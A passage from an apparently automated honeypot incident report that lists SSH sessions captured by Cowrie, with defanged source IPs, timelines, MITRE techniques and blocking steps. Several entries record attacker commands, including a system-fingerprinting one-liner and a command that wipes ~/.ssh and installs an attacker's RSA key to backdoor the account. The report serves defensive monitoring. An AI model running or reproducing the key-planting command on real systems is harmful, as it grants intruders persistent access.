| `2026-07-17 05:09:37` | `cowrie.login.success` |
| `2026-07-17 05:09:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15c5224c2226

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-17 05:09 |
| **Last Seen** | 2026-07-17 05:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:09:37` | `cowrie.session.connect` |
| `2026-07-17 05:09:37` | `cowrie.client.version` |
| `2026-07-17 05:09:38` | `cowrie.client.kex` |
| `2026-07-17 05:09:38` | `cowrie.login.success` |
| `2026-07-17 05:09:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cea363926c8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:10 |
| **Last Seen** | 2026-07-17 05:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:10:21` | `cowrie.session.connect` |
| `2026-07-17 05:10:21` | `cowrie.client.version` |
| `2026-07-17 05:10:21` | `cowrie.client.kex` |
| `2026-07-17 05:10:23` | `cowrie.login.success` |
| `2026-07-17 05:10:25` | `cowrie.session.params` |
| `2026-07-17 05:10:25` | `cowrie.command.input` |
| `2026-07-17 05:10:25` | `cowrie.command.input` |
| `2026-07-17 05:10:25` | `cowrie.command.input` |
| `2026-07-17 05:10:25` | `cowrie.command.input` |
| `2026-07-17 05:10:25` | `cowrie.command.input` |
| `2026-07-17 05:10:25` | `cowrie.command.success` |
| `2026-07-17 05:10:25` | `cowrie.command.input` |
| `2026-07-17 05:10:25` | `cowrie.command.input` |
| `2026-07-17 05:10:25` | `cowrie.command.input` |
| `2026-07-17 05:10:25` | `cowrie.command.input` |
| `2026-07-17 05:10:25` | `cowrie.log.closed` |
| `2026-07-17 05:10:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91959c564a9d

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-17 05:10 |
| **Last Seen** | 2026-07-17 05:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:10:53` | `cowrie.session.connect` |
| `2026-07-17 05:10:53` | `cowrie.client.version` |
| `2026-07-17 05:10:53` | `cowrie.client.kex` |
| `2026-07-17 05:10:53` | `cowrie.login.success` |
| `2026-07-17 05:10:54` | `cowrie.session.params` |
| `2026-07-17 05:10:54` | `cowrie.command.input` |
| `2026-07-17 05:10:55` | `cowrie.log.closed` |
| `2026-07-17 05:10:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e02afb208a30

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-07-17 05:11 |
| **Last Seen** | 2026-07-17 05:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:11:14` | `cowrie.session.connect` |
| `2026-07-17 05:11:15` | `cowrie.client.version` |
| `2026-07-17 05:11:15` | `cowrie.client.kex` |
| `2026-07-17 05:11:17` | `cowrie.login.success` |
| `2026-07-17 05:11:18` | `cowrie.direct-tcpip.request` |
| `2026-07-17 05:11:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-033dccf70f1e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:11 |
| **Last Seen** | 2026-07-17 05:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:11:49` | `cowrie.session.connect` |
| `2026-07-17 05:11:49` | `cowrie.client.version` |
| `2026-07-17 05:11:49` | `cowrie.client.kex` |
| `2026-07-17 05:11:51` | `cowrie.login.success` |
| `2026-07-17 05:11:52` | `cowrie.session.params` |
| `2026-07-17 05:11:52` | `cowrie.command.input` |
| `2026-07-17 05:11:52` | `cowrie.command.input` |
| `2026-07-17 05:11:52` | `cowrie.command.input` |
| `2026-07-17 05:11:52` | `cowrie.command.input` |
| `2026-07-17 05:11:52` | `cowrie.command.input` |
| `2026-07-17 05:11:52` | `cowrie.command.success` |
| `2026-07-17 05:11:52` | `cowrie.command.input` |
| `2026-07-17 05:11:52` | `cowrie.command.input` |
| `2026-07-17 05:11:52` | `cowrie.command.input` |
| `2026-07-17 05:11:52` | `cowrie.command.input` |
| `2026-07-17 05:11:52` | `cowrie.log.closed` |
| `2026-07-17 05:11:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4946780ffbf

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:13 |
| **Last Seen** | 2026-07-17 05:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:13:18` | `cowrie.session.connect` |
| `2026-07-17 05:13:18` | `cowrie.client.version` |
| `2026-07-17 05:13:18` | `cowrie.client.kex` |
| `2026-07-17 05:13:20` | `cowrie.login.success` |
| `2026-07-17 05:13:21` | `cowrie.session.params` |
| `2026-07-17 05:13:21` | `cowrie.command.input` |
| `2026-07-17 05:13:21` | `cowrie.command.input` |
| `2026-07-17 05:13:21` | `cowrie.command.input` |
| `2026-07-17 05:13:21` | `cowrie.command.input` |
| `2026-07-17 05:13:21` | `cowrie.command.input` |
| `2026-07-17 05:13:21` | `cowrie.command.success` |
| `2026-07-17 05:13:21` | `cowrie.command.input` |
| `2026-07-17 05:13:21` | `cowrie.command.input` |
| `2026-07-17 05:13:21` | `cowrie.command.input` |
| `2026-07-17 05:13:21` | `cowrie.command.input` |
| `2026-07-17 05:13:22` | `cowrie.log.closed` |
| `2026-07-17 05:13:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96380eda9de1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:14 |
| **Last Seen** | 2026-07-17 05:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:14:44` | `cowrie.session.connect` |
| `2026-07-17 05:14:44` | `cowrie.client.version` |
| `2026-07-17 05:14:44` | `cowrie.client.kex` |
| `2026-07-17 05:14:46` | `cowrie.login.success` |
| `2026-07-17 05:14:47` | `cowrie.session.params` |
| `2026-07-17 05:14:47` | `cowrie.command.input` |
| `2026-07-17 05:14:47` | `cowrie.command.input` |
| `2026-07-17 05:14:47` | `cowrie.command.input` |
| `2026-07-17 05:14:47` | `cowrie.command.input` |
| `2026-07-17 05:14:47` | `cowrie.command.input` |
| `2026-07-17 05:14:47` | `cowrie.command.success` |
| `2026-07-17 05:14:47` | `cowrie.command.input` |
| `2026-07-17 05:14:47` | `cowrie.command.input` |
| `2026-07-17 05:14:47` | `cowrie.command.input` |
| `2026-07-17 05:14:47` | `cowrie.command.input` |
| `2026-07-17 05:14:48` | `cowrie.log.closed` |
| `2026-07-17 05:14:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4154041a2ce7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:16 |
| **Last Seen** | 2026-07-17 05:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:16:12` | `cowrie.session.connect` |
| `2026-07-17 05:16:13` | `cowrie.client.version` |
| `2026-07-17 05:16:13` | `cowrie.client.kex` |
| `2026-07-17 05:16:15` | `cowrie.login.success` |
| `2026-07-17 05:16:16` | `cowrie.session.params` |
| `2026-07-17 05:16:16` | `cowrie.command.input` |
| `2026-07-17 05:16:16` | `cowrie.command.input` |
| `2026-07-17 05:16:16` | `cowrie.command.input` |
| `2026-07-17 05:16:16` | `cowrie.command.input` |
| `2026-07-17 05:16:16` | `cowrie.command.input` |
| `2026-07-17 05:16:16` | `cowrie.command.success` |
| `2026-07-17 05:16:16` | `cowrie.command.input` |
| `2026-07-17 05:16:16` | `cowrie.command.input` |
| `2026-07-17 05:16:16` | `cowrie.command.input` |
| `2026-07-17 05:16:16` | `cowrie.command.input` |
| `2026-07-17 05:16:17` | `cowrie.log.closed` |
| `2026-07-17 05:16:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1a5f4b3dd61

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:17 |
| **Last Seen** | 2026-07-17 05:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:17:41` | `cowrie.session.connect` |
| `2026-07-17 05:17:42` | `cowrie.client.version` |
| `2026-07-17 05:17:42` | `cowrie.client.kex` |
| `2026-07-17 05:17:43` | `cowrie.login.success` |
| `2026-07-17 05:17:45` | `cowrie.session.params` |
| `2026-07-17 05:17:45` | `cowrie.command.input` |
| `2026-07-17 05:17:45` | `cowrie.command.input` |
| `2026-07-17 05:17:45` | `cowrie.command.input` |
| `2026-07-17 05:17:45` | `cowrie.command.input` |
| `2026-07-17 05:17:45` | `cowrie.command.input` |
| `2026-07-17 05:17:45` | `cowrie.command.success` |
| `2026-07-17 05:17:45` | `cowrie.command.input` |
| `2026-07-17 05:17:45` | `cowrie.command.input` |
| `2026-07-17 05:17:45` | `cowrie.command.input` |
| `2026-07-17 05:17:45` | `cowrie.command.input` |
| `2026-07-17 05:17:45` | `cowrie.log.closed` |
| `2026-07-17 05:17:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8a22f3c9b8d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-17 05:18 |
| **Last Seen** | 2026-07-17 05:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:18:19` | `cowrie.session.connect` |
| `2026-07-17 05:18:19` | `cowrie.client.version` |
| `2026-07-17 05:18:19` | `cowrie.client.kex` |
| `2026-07-17 05:18:19` | `cowrie.login.success` |
| `2026-07-17 05:18:19` | `cowrie.direct-tcpip.request` |
| `2026-07-17 05:18:19` | `cowrie.direct-tcpip.data` |
| `2026-07-17 05:18:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-362a4784d705

| Field | Detail |
|---|---|
| **Source IP** | `14.33.96[.]3` |
| **First Seen** | 2026-07-17 05:18 |
| **Last Seen** | 2026-07-17 05:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:18:37` | `cowrie.session.connect` |
| `2026-07-17 05:18:38` | `cowrie.client.version` |
| `2026-07-17 05:18:38` | `cowrie.client.kex` |
| `2026-07-17 05:18:40` | `cowrie.login.success` |
| `2026-07-17 05:18:41` | `cowrie.direct-tcpip.request` |
| `2026-07-17 05:18:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.96[.]3` to AbuseIPDB if not already reported
- [ ] Block `14.33.96[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-657b9231508e

| Field | Detail |
|---|---|
| **Source IP** | `218.95.73[.]31` |
| **First Seen** | 2026-07-17 05:18 |
| **Last Seen** | 2026-07-17 05:18 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:18:47` | `cowrie.session.connect` |
| `2026-07-17 05:18:48` | `cowrie.client.version` |
| `2026-07-17 05:18:48` | `cowrie.client.kex` |
| `2026-07-17 05:18:51` | `cowrie.login.success` |
| `2026-07-17 05:18:51` | `cowrie.direct-tcpip.request` |
| `2026-07-17 05:18:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.95.73[.]31` to AbuseIPDB if not already reported
- [ ] Block `218.95.73[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dce003bf2d3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:19 |
| **Last Seen** | 2026-07-17 05:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:19:12` | `cowrie.session.connect` |
| `2026-07-17 05:19:12` | `cowrie.client.version` |
| `2026-07-17 05:19:12` | `cowrie.client.kex` |
| `2026-07-17 05:19:14` | `cowrie.login.success` |
| `2026-07-17 05:19:16` | `cowrie.session.params` |
| `2026-07-17 05:19:16` | `cowrie.command.input` |
| `2026-07-17 05:19:16` | `cowrie.command.input` |
| `2026-07-17 05:19:16` | `cowrie.command.input` |
| `2026-07-17 05:19:16` | `cowrie.command.input` |
| `2026-07-17 05:19:16` | `cowrie.command.input` |
| `2026-07-17 05:19:16` | `cowrie.command.success` |
| `2026-07-17 05:19:16` | `cowrie.command.input` |
| `2026-07-17 05:19:16` | `cowrie.command.input` |
| `2026-07-17 05:19:16` | `cowrie.command.input` |
| `2026-07-17 05:19:16` | `cowrie.command.input` |
| `2026-07-17 05:19:16` | `cowrie.log.closed` |
| `2026-07-17 05:19:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ff884098367

| Field | Detail |
|---|---|
| **Source IP** | `164.92.96[.]91` |
| **First Seen** | 2026-07-17 05:19 |
| **Last Seen** | 2026-07-17 05:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:19:51` | `cowrie.session.connect` |
| `2026-07-17 05:19:51` | `cowrie.client.version` |
| `2026-07-17 05:19:52` | `cowrie.client.kex` |
| `2026-07-17 05:19:52` | `cowrie.login.success` |
| `2026-07-17 05:19:53` | `cowrie.session.params` |
| `2026-07-17 05:19:53` | `cowrie.command.input` |
| `2026-07-17 05:19:53` | `cowrie.command.failed` |
| `2026-07-17 05:19:53` | `cowrie.log.closed` |
| `2026-07-17 05:19:53` | `cowrie.session.params` |
| `2026-07-17 05:19:53` | `cowrie.command.input` |
| `2026-07-17 05:19:53` | `cowrie.session.file_download` |
| `2026-07-17 05:19:53` | `cowrie.log.closed` |
| `2026-07-17 05:19:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.92.96[.]91` to AbuseIPDB if not already reported
- [ ] Block `164.92.96[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4b5193510b7

| Field | Detail |
|---|---|
| **Source IP** | `164.92.96[.]91` |
| **First Seen** | 2026-07-17 05:19 |
| **Last Seen** | 2026-07-17 05:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:19:53` | `cowrie.session.connect` |
| `2026-07-17 05:19:53` | `cowrie.client.version` |
| `2026-07-17 05:19:53` | `cowrie.client.kex` |
| `2026-07-17 05:19:54` | `cowrie.login.success` |
| `2026-07-17 05:19:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.92.96[.]91` to AbuseIPDB if not already reported
- [ ] Block `164.92.96[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae401d25f377

| Field | Detail |
|---|---|
| **Source IP** | `164.92.96[.]91` |
| **First Seen** | 2026-07-17 05:19 |
| **Last Seen** | 2026-07-17 05:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:19:54` | `cowrie.session.connect` |
| `2026-07-17 05:19:54` | `cowrie.client.version` |
| `2026-07-17 05:19:54` | `cowrie.client.kex` |
| `2026-07-17 05:19:54` | `cowrie.login.success` |
| `2026-07-17 05:19:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.92.96[.]91` to AbuseIPDB if not already reported
- [ ] Block `164.92.96[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11055f9dfb7f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:20 |
| **Last Seen** | 2026-07-17 05:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
